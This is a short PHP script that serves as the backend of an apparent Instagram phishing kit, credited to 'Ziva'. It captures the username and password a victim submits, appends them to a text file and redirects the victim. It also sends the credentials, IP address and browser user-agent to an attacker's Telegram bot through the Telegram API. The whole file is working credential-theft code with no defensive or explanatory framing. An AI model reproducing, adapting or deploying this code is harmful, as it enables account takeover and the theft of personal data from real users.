<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: redirect.php');

$username = $_POST['username'];
$password = $_POST['password'];


$ip =$_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
include "chatid.php";

include "apitoken.php";

$data = [
    'chat_id' => $chat,
    'text' => "⊚--------------------------------------------------------⊚
                   Dezyn By Ziva


IP ADDRESS   : $ip

USER-AGENT : $browser

USER ID : $username 

PASSWORD  : $password 

⊚--------------------------------------------------------⊚"
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );



?>
